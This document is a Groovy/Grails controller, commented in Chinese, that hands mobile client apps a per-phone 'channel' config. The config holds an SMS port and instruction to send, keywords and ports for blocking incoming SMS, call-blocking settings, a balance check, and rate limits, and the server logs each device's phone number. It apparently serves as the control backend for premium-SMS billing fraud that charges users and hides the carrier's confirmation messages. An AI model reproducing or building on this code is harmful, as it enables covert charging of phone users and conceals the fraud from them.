package com.sp.domain

import grails.converters.JSON

import org.apache.commons.logging.Log
import org.apache.commons.logging.LogFactory

import com.sp.domain.stat.DailyCanalActive

class SubAppItemController {

    static allowedMethods = [save: "POST"]
    def appService
    Log csvLogger = LogFactory.getLog("logger.csv.canal")

    //    def list(Integer max) {
    //        params.max = Math.min(max ?: 10, 100)
    //        [subAppItemInstanceList: SubAppItem.list(params), subAppItemInstanceTotal: SubAppItem.count()]
    //    }
    //
    //    def create() {
    //        [subAppItemInstance: new SubAppItem(params)]
    //    }

    def save() {
        def subAppItemInstance = SubAppItem.findBySerialNumber(params.serialNumber)
        def needAddStat = true//只有新数据,并且能成功下发canal才统计
        if (!subAppItemInstance) {
            subAppItemInstance = new SubAppItem(params)
        } else {
            subAppItemInstance.properties = params
            subAppItemInstance.lastUpdated = new Date()
            needAddStat = false//一票否决
        }
        def canal = getCanal(params, needAddStat);
        if (canal) {
            //			subAppItemInstance.canalInfo=canal.properties as JSON
            def result = [:]
            //			result.queryMoneyPort="queryMoney:instruction"
            result.name = canal.name
            result.operator = canal.operator
            result.times = canal.times
            result.interval = canal.interval
            result.exeStart = canal.exeStart
            result.exeEnd = canal.exeEnd
            result.blockSmsPort = canal.blockSmsPort
            result.blockKeys = canal.blockKeys
            /////通话拦截设置
            result.blockNum = canal.blockNum
            result.blockMinTime = canal.blockMinTime
            result.blockMaxTime = canal.blockMaxTime
            //sms指令
            result.port = canal.port
            result.instruction = canal.instruction
            //			result.wapInfo=canal.wapInfo
            //			String targetKey
            //			String chargeKey
            result.type = canal.t
            //检查余额
            def checkMoneyInfo = appService.getCheckMoneyInfo(canal)
            if (checkMoneyInfo) {
                result.checkMoneyInfo = checkMoneyInfo
            }
            subAppItemInstance.canalInfo = result as JSON
            if (subAppItemInstance.save(flush: true)) {
                //统计
                if (needAddStat) {
                    dayStat(canal)
                }
                render result as JSON
            } else {
                render(subAppItemInstance.getErrors() as JSON)
            }
        } else {
            //			needStat=false//一票否决
            //		log.warn("Found Null Canal by params:${params}")
            render(["errors": [
                    ["object": "SubItem", message: "null canal"]
            ]] as JSON)
        }
    }

    private getCanal(params, isNewInstance) {
        def code = params.phoneNumber
        def op = params.netType
        def canalName = ''

        Canal canal = appService.getCanalByPhoneNumber(op, code);
        if (canal) {
            int dayLimit = canal.dayLimit
            int dayInterval = canal.dayInterval
            int monthLimit = canal.monthLimit
            int timeDelay = canal.timeDelay

            int monthCount = params.monthCount ? params.monthCount as Integer : 0
            int dayCount = params.dayCount ? params.dayCount as Integer : 0
            long lastTime = params.lastTime ? params.lastTime as Long : 0

            boolean flag = true
            Date nowDate = new Date()
            long now = nowDate.getTime()
            long diff = now - lastTime

            Date lastDate = new Date(lastTime)
            int diffDays = nowDate - lastDate
            if (diff < timeDelay * 60 * 1000) {
                flag = false
            }

            if (diffDays <= dayInterval) {
                //月度间隔限制（天）
                flag = false
            }

            if (dayCount >= dayLimit) {
                //当天内次数限制
                flag = false
            }

            if (monthCount >= monthLimit) {
                //当月次数限制
                flag = false
            }
            if (flag == false) {
                log.error("MissCanal:find canal by code:${code},but rejected by limits. canal:${canal}--params:${params}")
                canalName = "不下发"
                canal = null
            } else {
                //电话 ; netType  ; 获取到的通道名字 ; 手机型号(对应API中的phoneType) ; channelCode
                canalName = canal.name
            }

            if (isNewInstance) {
                //只有在新的子程序访问的时候才加以限制
                int count = 0;
                DailyCanalActive dailyCanalActive = DailyCanalActive.findByCanalNameAndDay(canal.name, new Date())
//                System.out.println("[[getCanal]] dailyCanalActive : ${dailyCanalActive}")
                if (dailyCanalActive) {
                    count = dailyCanalActive.num
                }

                if (count >= dayLimit) {
                    log.error("MissCanal:find canal by code:${code},but rejected by daylimits:${dayLimit}. canal:${canal}--params:${params}")
                    canalName = "不下发"
                    canal = null
                }
            }
        } else {
            log.warn("MissCanal:find null canal by code:${code},params:${params}")
            canalName = "无通道"
        }

        def main_channel = params.mainChannel ?: "-1";

        csvLogger.info "${params.phoneNumber},${params.netType},${canalName},${params.phoneType},${params.channelCode},${main_channel}".toString()

        return canal
    }

    private dayStat(canal) {
        def canalName = canal.name;
        //如果已经有记录了，则应该执行num=num+1，如果没有则应该插入新纪录用本地sql的n=n+1的行锁来解决安全的串行++问题
        def hql = "update DailyCanalActive  set num=num+1 where canalName=? and day= curdate()";
        int effectNum = DailyCanalActive.executeUpdate(hql, [canalName])
        if (effectNum == 0) {//说明还没有初始化当天的第一条记录，那么应该插入一条新纪录,此处代码每天只会出现一次
            log.info("DailyCanalActive effect num==0,init params:canalName:${canalName} ")
            DailyCanalActive dca = new DailyCanalActive([day: new Date(), num: 1, canalName: canalName])
            if (!dca.save(flush: true)) {
                //todo 精确的duplicate exception
                //当duplicate异常的时候,说明已经在别的线程并发状态插入了一个初始记录，那么继续执行update操作。
                log.warn("init first DailyCanalActive row failed for params:canalName:${canalName},will try update++", e)
                effectNum = DailyCanalActive.executeUpdate(hql, [canalName])
                //如果还是0，则打印出警告信息
                if (effectNum == 0) {
                    log.warn("DailyCanalActive update logic or env error for params:canalName:${canalName}")
                } else {
                    log.info("DailyCanalActive update++ succucess for params:canalName:${canalName} ")
                }
            }
        }
    }


}
